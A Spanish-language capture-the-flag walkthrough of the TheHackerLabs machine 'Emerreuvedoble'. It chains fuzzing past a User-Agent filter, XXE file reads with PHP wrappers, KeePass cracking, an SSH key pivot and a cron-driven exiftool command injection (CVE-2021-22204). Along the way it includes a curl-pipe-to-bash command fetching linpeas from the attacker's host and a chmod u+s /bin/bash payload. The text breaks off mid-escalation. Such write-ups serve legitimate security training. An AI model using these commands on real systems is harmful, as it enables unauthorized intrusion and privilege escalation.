---
title: "Emerreuvedoble - TheHackerLabs"
date: 2025-07-08
draft: false
slug: "THL-writeup-emerreuvedoble"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, analizamos la página web activa en el puerto 80, pero al no poder aplicarle Fuzzing, descubrimos que es probable que utilice un WAF, por lo que utilizamos una cabecera User-Agent personalizada, lo que nos permite descubrir una página de envío de paquetes. Dicha página tiene un formulario que resulta ser vulnerable al ataque XML External Entity (XXE). Gracias al XXE, descubrimos que está activo el servicio FTP y que la página está desplegada en un contenedor de Docker. Aplicamos XXE + PHP Wrappers para leer el archivo que procesa el XML, encontrando ahí un archivo que es una base de datos de KeePass. Dicho archivo, lo obtenemos del servicio FTP activo, lo crackeamos y obtenemos las credenciales de un usuario con el que ganamos acceso al contenedor de Docker. Dentro del contenedor, descubrimos archivos de otro usuario, entre ellos, una llave id_rsa que no tiene contraseña, lo que nos permite ganar acceso a la máquina víctima. Dentro de la máquina víctima, descubrimos un script que se ejecuta cada minuto como una tarea CRON. Dicho script es vulnerable a inyección de comandos, pues ocupa una versión vulnerable de exiftool que permite esto (CVE-2021-22204). Esto nos permite darle permisos SUID a la Bash, siendo así que escalamos privilegios y nos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Docker", "Web Enumeration", "BurpSuite", "Fuzzing", "XML External Entity (XXE) Attack", "XXE + PHP Wrappers", "Cracking Hash", "Cracking KeePass Password Database", "Docker Conatiner Enumeration", "System Recognition (Linux)", "User Pivoting", "Abusing CRON Jobs", "exiftool Command Injection (CVE-2021-22204)", "Privesc - Abusing CRON Jobs", "Privesc - exiftool Command Injection (CVE-2021-22204)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "wafw00f"
  - "BurpSuite"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "base64"
  - "keepass2john"
  - "JohnTheRipper"
  - "KeePassXC"
  - "ssh"
  - "find"
  - "curl"
  - "linpeas.sh"
  - "nano"
  - "chmod"
  - "ssh2john"
  - "wget"
  - "pspy64"
  - "touch"
  - "exiftool"
  - "cat"
  - "bash"
links:
  - "https://portswigger.net/web-security/xxe"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#php-wrapper-inside-xxe"
  - "https://github.com/peass-ng/PEASS-ng/tree/master"
  - "https://github.com/DominicBreuker/pspy"
  - "https://ine.com/blog/exiftool-command-injection-cve-2021-22204"
  - "https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies"
  - "https://www.exploit-db.com/exploits/50911"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-emerreuvedoble/MRVV.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.170
PING 192.168.10.170 (192.168.10.170) 56(84) bytes of data.
64 bytes from 192.168.10.170: icmp_seq=1 ttl=64 time=1.67 ms
64 bytes from 192.168.10.170: icmp_seq=2 ttl=64 time=1.15 ms
64 bytes from 192.168.10.170: icmp_seq=3 ttl=64 time=0.917 ms
64 bytes from 192.168.10.170: icmp_seq=4 ttl=64 time=0.854 ms

--- 192.168.10.170 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3053ms
rtt min/avg/max/mdev = 0.854/1.148/1.673/0.322 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.170 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 12:23 CST
Initiating ARP Ping Scan at 12:23
Scanning 192.168.10.170 [1 port]
Completed ARP Ping Scan at 12:23, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:23
Scanning 192.168.10.170 [65535 ports]
Discovered open port 22/tcp on 192.168.10.170
Discovered open port 80/tcp on 192.168.10.170
Discovered open port 22222/tcp on 192.168.10.170
Completed SYN Stealth Scan at 12:23, 8.00s elapsed (65535 total ports)
Nmap scan report for 192.168.10.170
Host is up, received arp-response (0.00092s latency).
Scanned at 2025-07-07 12:23:05 CST for 8s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 63
22222/tcp open  easyengine syn-ack ttl 63
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Tenemos 3 puertos abiertos, pero me interesa bastante el **puerto 22222**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,22222 192.168.10.170 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 12:25 CST
Nmap scan report for 192.168.10.170
Host is up (0.0014s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 16:a7:1b:4b:a7:6c:ae:4b:09:5a:22:28:98:32:9c:b0 (ECDSA)
|_  256 a4:5e:6d:aa:a4:95:96:f1:3b:a4:fa:5a:ed:73:ac:cc (ED25519)
80/tcp    open  http    Apache httpd 2.4.38

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
22222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)

| ssh-hostkey: 
|   2048 a4:0e:43:ca:5c:dd:da:9d:63:12:f4:b5:c7:52:b1:e3 (RSA)
|   256 fe:c2:ec:82:68:67:d0:27:c3:8b:7d:a1:13:06:d2:ec (ECDSA)
|_  256 55:a6:b4:75:5f:41:61:08:bb:ba:3f:d1:c9:21:97:ff (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 172.200.5.5; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Podemos ver que la página web activa en el **puerto 80**, muestra la página por defecto de **Apache2**. Además, no encontraremos nada si revisamos su código fuente.

Observa la IP que se obtuvo del **servicio SSH** del **puerto 22222**, pues parece ser una IP de un **contenedor de Docker**. Quizá más adelante, lo podemos comprobar.

Como no tenemos credenciales válidas o algún usuario al que podamos aplicarle fuerza bruta para el **servicio SSH**, vamos a aplicar **Fuzzing** a la página web, pues puede que tenga algún directorio o archivo oculto por ahí.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

Cuando intentamos aplicar **Fuzzing** como normalmente hacemos, no solo no encontrará nada, sino que tendremos que aplicar un filtro para que evite ciertas respuestas, de lo contrario, obtendremos esta clase de respuestas:
```bash
download                [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
news                    [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
crack                   [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
14                      [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 36ms]
```
Y aun con los filtros, no encontraremos nada.

El simple hecho de que se necesiten filtros, ya nos dice que algo está pasando aquí.

Observa lo que pasa si intentamos obtener información de la página web con **whatweb**:
```bash
whatweb http://192.168.10.170
http://192.168.10.170 [403 Forbidden] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.10.170], Title[403 Forbidden]
```
Nos da una respuesta **Forbidden**, por lo que parece que no está analizando bien la página por alguna razón.

Puede que esté activo un **WAF**, lo que podemos comprobar con la herramienta **wafw00f**:
```bash
wafw00f http://192.168.10.170

                 ?              ,.   (   .      )        .      "
         __        ??          ("     )  )'     ,'        )  . (`     '`
    (___()'`;   ???          .; )  ' (( (" )    ;(,     ((  (  ;)  "  )")
    /,___ /`                 _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( ' )
    \\   \\                 |____|____|____|____|____|____|____|____|____|

                                ~ WAFW00F : v2.3.1 ~
                    ~ Sniffing Web Application Firewalls since 2014 ~

[*] Checking http://192.168.10.170
[+] Generic Detection results:
[*] The site http://192.168.10.170 seems to be behind a WAF or some sort of security solution
[~] Reason: The response was different when the request wasn't made from a browser.
Normal response code is "200", while the response code to a modified request is "403"
[~] Number of requests: 4
```
Una forma en la que podemos aplicar un bypass para que nos permita aplicar **Fuzzing**, es utilizar la **cabecera User-Agent** legitima.

Esto porque las herramientas que hemos usado, usan peticiones "extrañas" para un servidor que tiene un **WAF** activo y obviamente los bloquea.

Una forma de aplicar un bypass que nos permita realizar **Fuzzing** es utilizando una **cabecera User-Agent** legítima, como la de un navegador real.

Esto porque herramientas como **ffuf, whatweb, wafw00f y gobuster** envían peticiones con **User-Agent** genéricos (por ejemplo, **Go-http-client**, **curl**, etc.), que pueden ser consideradas sospechosas por el servidor.

Esta cabecera la podemos obtener desde **BurpSuite** al capturar la página:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura1.png">
</p>

Copia esa cabecera y agrégala como otra flag en el comando de **ffuf**. Con esto, ya obtendremos un resultado:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.170/FUZZ -t 300 -fs 398 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.170/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 398
________________________________________________

services                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 5561ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 47ms]
server-status           [Status: 403, Size: 212, Words: 29, Lines: 11, Duration: 44ms]
:: Progress: [220545/220545] :: Job [1/1] :: 258 req/sec :: Duration: [0:02:41] :: Errors: 8 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fs*	     | Para filtrar y no mostrar un tamaño de respuesta especifico. |
| *-H*	     | Para utilizar una cabecera User-Agent personalizada. |

Ahora, probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.170/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --exclude-length 398 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.170/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          398
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/services             (Status: 301) [Size: 319] [--> http://192.168.10.170/services/]
/server-status        (Status: 403) [Size: 212]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--exclude-length* | Para filtrar y no mostrar un tamaño de respuesta especifico. |
| *-H*       | Para utilizar una cabecera User-Agent personalizada. |

Descubrimos un directorio, vamos a visitarlo:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura2.png">
</p>

Parece ser una página para envío de paquetes.

Analicémosla.

### Analizando Página de Envios de Paquetes {#Envio}

Revisando su código fuente, podemos ver cómo funciona la página:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura3.png">
</p>

Vemos que el formulario está obteniendo los datos que introduzcamos, pero no se ve que se aplique una sanitización.

Además, ahí está vemos un script que realiza las acciones del formulario.

Por lo que entiendo, el script hace lo siguiente:
* Obtiene los datos que se introduzcan en los campos del formulario.
* Crea un **documento XML** y un nodo raíz llamado **formData**. Este nodo obtiene los valores del formulario y crea una **etiqueta XML** por cada clave valor, por ejemplo `nombre:pepito`, etc.
* Después, serializa el **documento XML** a una cadena de texto para enviarlo a un servidor.
* Por último, envía el **XML** mediante una **petición POST** a **procesar_envio.php** y establece la cabecera `Content-Type:application/xml`, para indicar que está enviando un **XML**. Además, genera un mensaje sobre si se envió o no la petición.

Podemos comprobar con **BurpSuite** cómo se crea el **XML** a enviar:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura4.png">
</p>

Gracias a este análisis, sabemos que es posible que la página web sea vulnerable al **ataque XXE**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando XML External Entity (XXE) para Leer Archivos Internos {#XXE}

Aquí puedes ver un blog de la academia de **PortSwigger** que explica muy bien qué es el **ataque XXE** y sus variantes:
* <a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger: XXE</a>

De este blog, ocuparemos el siguiente payload que nos permitirá leer el archivo `/etc/passwd` y posiblemente otros:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura5.png">
</p>

Vamos a pegarlo en la petición y a modificarlo para que cumpla con los mismos datos usados en la petición original, quedando de esta forma:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura6.png">
</p>

Funcionó correctamente y vemos que hay un usuario llamado **pepita**.

Entonces, es posible que podamos ver el contenido de otros archivos y uno que nos interesa es el `/etc/hosts`, pues puede que hayan registrado ahí algún contenedor que sirva de servidor:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura7.png">
</p>

Muy bien, no solamente vemos un servidor registrado, sino que hay un dominio de un **servidor FTP** registrado ahí.

Algo que podemos hacer, es tratar de ver el archivo **procesar_envio.php** al que hace referencia el script del formulario.

El problema es que al apuntar a este, no veremos nada:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura8.png">
</p>

Para estos casos, podemos utilizar un **PHP Wrapper** que codifique el archivo en **base64** para que podamos decodificarlo en nuestra máquina.

### Aplicando XXE y PHP Wrappers para Leer Archivos de PHP {#PHPWrapper}

Aquí puedes encontrar algunos payloads de **XXE** que incluyen **PHP Wrappers**:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#php-wrapper-inside-xxe" target="_blank">PayloadAllTheThings: XML External Entity</a>

Aplicaremos el siguiente payload:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura9.png">
</p>

Modifiquemos nuestro payload actual y enviemos la petición:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura10.png">
</p>

Excelente, obtuvimos un código codificado en **base64**, así que vamos a decodificarlo:
```bash
echo -n "PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2x.." | base64 -d
<?php
libxml_disable_entity_loader (false);

if ($_SERVER["REQUEST_METHOD"] == "POST" && strpos($_SERVER["CONTENT_TYPE"], "application/xml") !== false) {
    // Get the raw POST data
    $rawData = file_get_contents("php://input");

    // Load the XML
    $dom = new DOMDocument();
    $dom->substituteEntities = true;
    $dom->loadXML($rawData);

    $xml = simplexml_import_dom($dom);

    // Extract data from XML
    $nombre = $xml->nombre;
    $direccion = htmlspecialchars($xml->direccion);
    $poblacion = htmlspecialchars($xml->poblacion);
    $cp = htmlspecialchars($xml->cp);

    /*

Encuentra el fichero passwords.kdb ¿Estará en esta máquina o en otra?

    */

    // Display the data
    echo "<h1>Datos</h1>";
    echo "Nombre: " . $nombre . "<br>";
    echo "Dirección: " . $direccion . "<br>";
    echo "Población: " . $poblacion . "<br>";
    echo "Código postal: " . $cp . "<br>";
} else {
    echo "Invalid request.";
}
?>
```
Observa ese comentario, parece que existe un archivo llamado **passwords.kdb** que es de **KeePass**. Puede que ahí encontremos alguna credencial de acceso para el **servicio SSH**.

El problema es que no sabemos dónde está y buscando por varios directorios comunes, no encontramos nada.

Algo que podemos probar es el **servicio FTP** activo, puede que esté ahí este archivo.

Vamos a comprobarlo:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura11.png">
</p>

Obtuvimos el contenido del archivo, intentemos decodificarlo:
```bash
echo -n "A9mimmX7S7UCAAAAAgADA..." | base64 -d
٢�e�K�␦��Kk9e|��W'�X2�WZ���ߌZz~ѷ����{~�ٛ����q�ڑ���y��~��܃�C�ś�ſ]��g`	����I�\8}�a���krmg�P�� |1����
```
Cierto, es un archivo cifrado.

### Crackeando Base de Datos de Contraseñas de KeePass {#KeePass}

Vamos a guardar el contenido en un archivo y obtengamos el hash de este archivo con la herramienta **keepass2john**:
```bash
echo -n "A9mimmX7S7UCAAAAAgADA..." | base64 -d > passwords.kdb

keepass2john passwords.kdb > hash
Inlining passwords.kdb
```

Ahora, crakeamos el hash con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 50000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
diamonds         (passwords.kdb)     
1g 0:00:00:03 DONE (2025-07-07 16:02) 0.3086g/s 296.2p/s 296.2c/s 296.2C/s blonde..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Excelente, tenemos la contraseña para la base de datos de contraseñas que copiamos.

Para abrirlo con **KeePassXC**, necesitamos importar este archivo a la versión 1 de **KeePass**, dándole la ruta del archivo y la contraseña:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura12.png">
</p>

Le damos a continuar y veremos el contenido de este archivo:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura13.png">
</p>

Ya solamente, importamos por completo el archivo y abrimos esa base de datos:

<p align="center">
<img src="/assets/images/THL-writeup-emerreuvedoble/Captura14.png">
</p>

Tenemos la contraseña del **usuario pepita**.

Estas credenciales servirán con el **servicio SSH** del **puerto 22222**:
```bash
ssh pepita@192.168.10.170 -p 22222
pepita@192.168.10.170's password: 
Linux webserver 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
pepita@webserver:~$ whoami
pepita
pepita@webserver:~$ hostname -I
172.200.5.5
```
Estamos dentro del contenedor.

Aquí podemos encontrar la flag del usuario:
```bash
pepita@webserver:~$ ls
user.txt
pepita@webserver:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de Contenedor de Docker {#Docker}

No tenemos el comando **sudo**, por lo qué no sabemos que privilegios tenemos:
```bash
pepita@webserver:~$ sudo -l
-bash: sudo: command not found
```

Busquemos si hay algún binario con **permisos SUID**:
```bash
pepita@webserver:~$ find / -perm -4000 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
No hay alguno que podamos usar.

Al no encontrar algo más, utilicemos la herramienta **linpeas.sh**. Puedes descargarla aquí:
* <a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: linpeas.sh</a>

En mi caso, no lo voy a descargar, sino ejecutarlo de manera remota utilizando un servidor de **Python3** en mi máquina:
```bash
pepita@webserver:~$ curl http://Tu_IP/linpeas.sh | bash
```

Observa lo siguiente:
```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/pepita
/host/juanita
/host/juanita/.bash_logout
/host/juanita/.bashrc
/host/juanita/.profile
/host/juanita/.ssh
/host/juanita/.ssh/authorized_keys
/host/juanita/.ssh/id_rsa
/run/lock
/tmp
/var/lib/php/sessions
/var/tmp
```
Parece que hay archivos de otro usuario en el directorio `/host`, y ahí vemos una llave **id_rsa**.

Si nos movemos a esa ruta y listamos los archivos, vemos el directorio **docker**:
```bash
pepita@webserver:~$ ls -la /host/juanita/
total 28
drwx------ 4 pepita pepita 4096 May 23  2024 .
drwxr-xr-x 3 root   root   4096 May 23  2024 ..
lrwxrwxrwx 1 root   root      9 May 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pepita pepita  220 May 23  2024 .bash_logout
-rw-r--r-- 1 pepita pepita 3526 May 23  2024 .bashrc
-rw-r--r-- 1 pepita pepita  807 May 23  2024 .profile
drwx------ 2 pepita pepita 4096 May 24  2024 .ssh
drwxr-xr-x 4 root   root   4096 May 23  2024 docker
```

Podemos leer la **llave privada id_rsa**:
```bash
pepita@webserver:/host/juanita$ cat .ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
```

Lo curioso es que si la copiamos en nuestra máquina e intentamos obtener su hash con **ssh2john**, nos dirá que no tiene una contraseña:
```bash
nano id_rsa
chmod 600 id_rsa
ssh2john id_rsa > hash
id_rsa has no password!
```
Esto quiere decir que no se usó una contraseña para cifrar la llave, entonces, podemos usar esa llave sin ninguna restricción.

Probémoslo:
```bash
ssh -i id_rsa juanita@192.168.10.170
Linux emerreuvedoble 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

███╗   ███╗██████╗ ██╗   ██╗██╗   ██╗
████╗ ████║██╔══██╗██║   ██║██║   ██║
██╔████╔██║██████╔╝██║   ██║██║   ██║
██║╚██╔╝██║██╔══██╗╚██╗ ██╔╝╚██╗ ██╔╝
██║ ╚═╝ ██║██║  ██║ ╚████╔╝  ╚████╔╝ 
╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝    ╚═══╝  
                                     

Last login: Tue Jul  8 00:24:23 2025
juanita@emerreuvedoble:~$ whoami
juanita
```
Estamos dentro de la máquina víctima.

### Enumeración de la Máquina Víctima {#linEnum}

Listando los archivos de este usuario, serán los mismos que encontramos en el **contenedor de Docker**:
```bash
juanita@emerreuvedoble:~$ ls -la
total 28
drwx------ 4 juanita juanita 4096 may 23  2024 .
drwxr-xr-x 3 root    root    4096 may 23  2024 ..
lrwxrwxrwx 1 root    root       9 may 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 juanita juanita  220 may 23  2024 .bash_logout
-rw-r--r-- 1 juanita juanita 3526 may 23  2024 .bashrc
drwxr-xr-x 4 root    root    4096 may 23  2024 docker
-rw-r--r-- 1 juanita juanita  807 may 23  2024 .profile
drwx------ 2 juanita juanita 4096 may 24  2024 .ssh
```

Si revisamos el directorio del **Docker**, encontraremos un directorio que es el servidor web, pues dicho servidor, tiene un archivo **.htaccess** que era quien nos impedía aplicar **Fuzzing**:
```bash
juanita@emerreuvedoble:~/docker/webserver$ cat .htaccess 
# .htaccess file in the root of your web directory (/var/www/html/)

RewriteEngine On

# Check if the User-Agent starts with "Mozilla"
RewriteCond %{HTTP_USER_AGENT} !^Mozilla [NC]

# Deny access if the User-Agent does not start with "Mozilla"
RewriteRule ^ - [F,L]

# Specify the custom 403 error document
ErrorDocument 403 /403.html
```
Resulta que este archivo declara reglas sobre el servidor que permitieron bloquear cualquier petición que no tenga la **cabecera User-Agent Mozilla**.

Es decir, no era un **WAF** el que evitaba aplicarle **Fuzzing** a la página web, sino reglas declaradas en el servidor web.

Buscando por ahí, encontramos un script de **Bash** en el directorio `/opt`:
```bash
juanita@emerreuvedoble:~$ ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 may 23  2024 .
drwxr-xr-x 18 root root 4096 may 23  2024 ..
drwx--x--x  4 root root 4096 may 23  2024 containerd
-rwxr-xr-x  1 root root  330 may 23  2024 remove_temp.sh
```

Leámoslo:
```bash
juanita@emerreuvedoble:~$ cat /opt/remove_temp.sh
#! /bin/bash
cache_directory="/tmp"
for file in "$cache_directory"/*; do

    if [[ -f "$file" ]]; then

        creator=$(/usr/bin/exiftool -s -s -s -Creator "$file" 2>/dev/null | cut -d " " -f1)  

        if [[ "$creator" -eq "juanita" ]]; then
            echo "Removing $file"
            rm "$file"
        fi

    fi

done
```
Este script hace lo siguiente:
* Revisa todos los archivos del directorio `/tmp`.
* Utiliza la herramienta **exiftool** para leer el campo **"Creator"** de cada archivo.
* Si el **"Creator"** es el **usuario juanita**, entonces, elimina el archivo.

El problema que veo es que no podemos modificar ni ejecutar este script. Además, parece que está hecho para ejecutarse cada cierto tiempo.

Comprobémoslo con la herramienta **pspy**:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Una vez que la descargues en tu máquina, abre un servidor con **Python3** y descárgalo en la máquina víctima con **wget**:
```bash
juanita@emerreuvedoble:~$ wget http://Tu_IP/pspy64
```

Al ejecutarlo y esperar unos minutos, nos muestra lo siguiente:
```bash
juanita@emerreuvedoble:~$ chmod +x pspy64 
juanita@emerreuvedoble:~$ ./pspy64
...
2025/07/08 00:30:33 CMD: UID=0     PID=1      | /sbin/init 
2025/07/08 00:31:01 CMD: UID=0     PID=13265  | /usr/sbin/CRON -f 
2025/07/08 00:31:01 CMD: UID=0     PID=13264  | /usr/sbin/cron -f 
2025/07/08 00:31:01 CMD: UID=0     PID=13266  | /usr/sbin/CRON -f 
2025/07/08 00:31:01 CMD: UID=0     PID=13267  | /usr/sbin/CRON -f 
2025/07/08 00:31:01 CMD: UID=0     PID=13268  | /bin/sh -c bash -c /opt/remove_temp.sh 
2025/07/08 00:31:01 CMD: UID=0     PID=13269  | /bin/sh -c bash -c /root/reset.sh
```
Cada minuto se ejecuta el script **remove_temp.sh** que ya analizamos.

### Escalando Privilegios Abusando de Tarea CRON e Inyectando Comandos con exiftool {#CRON}

Existe un blog de **INE Security** que explica el cómo se puede abusar de **exiftool** para inyectar comandos en la metadata de un archivo o imagen:
* <a href="https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies" target="_blank">ExifTool Command Injection (CVE-2021-22204)</a>

Esto funciona porque hay versiones de **exiftool** vulnerables a inyección de comandos como la **versión 12.24**, donde se le inyectan los comandos utilizando los metadatos de un archivo o imagen. 

El problema es que se necesitan algunas herramientas instaladas en la máquina víctima que no tenemos, pero vamos a tratar de utilizar la misma sintaxis del script para inyectarle comandos.

Primero, creamos un archivo vacío:
```bash
juanita@emerreuvedoble:/tmp$ touch test.jpg
```

Luego, intentamos inyectarle un comando a ese archivo en sus metadatos, usando el campo **"Creator"**:
```bash
juanita@emerreuvedoble:/tmp$ exiftool -Creator='$(chmod u+s /bin/bash)' test.jpg
Error: Format error in file - test.jpg
    0 image files updated
    1 files weren't updated due to errors
```
Parece que no le gusta el formato que usamos.

Entonces, vamos a usar un archivo sin extensión y le inyectamos el comando:
```bash
juanita@emerreuvedoble:/tmp$ touch test; exiftool -Creator='$(chmod u+s /bin/bash)' test
    1 image files updated
```
Funcionó.

Pero, después del minuto, no se elimina el archivo, por lo que no se está ejecutando el comando que queremos.

Quiero pensar que es porque el creador de dicho archivo, ya no es el **usuario juanita**, por lo que ya no cumple con las condiciones del script.

Entonces, tratemos de que el archivo ejecute un script de otro directorio. Dicho script, le dará **permisos SUID** a la **Bash**.

Creamos nuestro script en el directorio del **usuario juanita**:
```bash
juanita@emerreuvedoble:~$ cat bashSUID.sh 
#!/bin/bash
chmod u+s /bin/bash
```

